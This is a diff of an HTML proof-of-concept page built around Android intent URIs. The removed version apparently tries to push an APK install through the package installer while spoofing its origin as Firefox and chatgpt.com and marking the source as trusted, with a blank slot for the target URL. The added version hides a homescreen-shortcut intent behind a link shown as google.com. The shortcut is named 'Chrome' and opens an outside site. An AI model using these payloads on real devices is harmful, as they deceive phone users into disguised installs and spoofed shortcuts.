@@ -4,90 +4,67 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Firefox Android Intent Test</title>
+  <title>Android Intent PoC</title>
   <style>
     body {
       font-family: system-ui, sans-serif;
-      background: #f4f5f8;
+      background: #f8f9fa;
       color: #202124;
       min-height: 100vh;
-      display: grid;
-      place-items: center;
-      padding: 20px;
       margin: 0;
+      display: grid;
+      place-content: center;
+      text-align: center;
     }
 
-    main {
-      width: 100%;
-      max-width: 520px;
-      box-sizing: border-box;
-      background: white;
-      padding: 24px;
-      border-radius: 18px;
-      box-shadow: 0 8px 30px rgba(0,0,0,.08);
-    }
-
-    h1 {
-      font-size: 22px;
-    }
-
-    p {
-      line-height: 1.5;
-      color: #5f6368;
-    }
-
-    .notice {
-      background: #fff4df;
-      color: #684b12;
-      padding: 14px;
-      border-radius: 10px;
-      margin: 18px 0;
-    }
-
-    button {
-      width: 100%;
-      padding: 16px;
-      border: none;
-      border-radius: 12px;
-      background: #5b45c6;
+    a {
+      display: inline-block;
+      padding: 16px 28px;
+      background: #1a73e8;
       color: white;
-      font-size: 16px;
-      font-weight: 650;
-      cursor: pointer;
+      text-decoration: none;
+      font-weight: 600;
+      border-radius: 8px;
+    }
+
+    a:active {
+      background: #1557b0;
     }
   </style>
 </head>
 <body>
 
-<main>
-  <h1>Firefox Android Intent Test</h1>
+  <h2>Android Intent Test</h2>
+  <a href="https://google.com" id="intentLink">
+    Open Window & Android Intent Test
+  </a>
 
-  <p>
-    Single-button Android Intent testing.
-  </p>
+  <script>
+    let triggered = false;
 
-  <div class="notice">
-    Test only. This action may open an external application
-    or Google Play. No automatic installation is performed.
-  </div>
+    const link = document.getElementById("intentLink");
 
-  <button id="run" type="button">
-    Run Intent Test
-  </button>
+    link.addEventListener("contextmenu", () => {
+      if (triggered) return;
+      triggered = true;
 
-  <p id="status" aria-live="polite"></p>
-</main>
+      setTimeout(() => {
+        const intentUrl =
+          "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
 
-<script>
-const intentUri = "intent://www.chatgpt.com/#Intent;scheme=https;package=com.termux;action=android.intent.action.VIEW;category=android.intent.category.DEFAULT;category=android.intent.category.BROWSABLE;type=application/vnd.android.package-archive;launchFlags=0x38800000;S.browser_fallback_url=intent%3A%2F%2Fwww.firefox.com%2F%23Intent%3Bscheme%3Dhttps%3Bpackage%3Dcom.android.packageinstaller%3Baction%3Dandroid.intent.action.VIEW%3Btype%3Dapplication%2Fvnd.android.package-archive%3Bs.browser_fallback_url%3Dhttps%253A%252F%252FURL_TUJUAN_ANDA_DISINI%3Bend;S.com.android.browser.application_id=org.mozilla.firefox;S.android.intent.extra.REFERRER_NAME=android-app%3A%2F%2Forg.mozilla.firefox;S.com.android.browser.headers=Referer%3A%https%3A%2F%2Fwww.chatgpt.com%2F%0AOrigin%3A%https%3A%2F%2Fwww.chatgpt.com%2F;B.android.intent.extra.NOT_UNKNOWN_SOURCE=true;B.android.intent.extra.INSTALLER_PACKAGE_NAME=org.mozilla.firefox;end";
+        window.location.href = intentUrl;
 
-document.getElementById("run").addEventListener("click", function() {
-  document.getElementById("status").textContent =
-    "Intent launch requested.";
+        setTimeout(() => {
+          triggered = false;
+        }, 1120);
 
-  window.location.href = intentUri;
-});
-</script>
+      }, 2500);
+    });
+
+    link.addEventListener("touchstart", () => {}, {
+      passive: true
+    });
+  </script>
 
 </body>
 </html>
